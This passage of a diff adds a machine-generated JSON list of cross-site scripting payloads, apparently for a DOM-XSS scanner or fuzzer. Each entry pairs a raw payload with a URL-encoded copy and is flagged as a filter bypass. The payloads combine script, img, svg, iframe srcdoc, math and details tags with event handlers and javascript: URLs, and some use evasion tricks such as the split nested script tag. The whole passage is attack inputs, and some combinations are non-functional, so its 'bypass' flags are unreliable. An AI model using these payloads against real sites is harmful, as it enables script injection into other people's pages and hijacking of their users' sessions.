+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=prompt(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dprompt%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%283%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=alert(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dalert%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
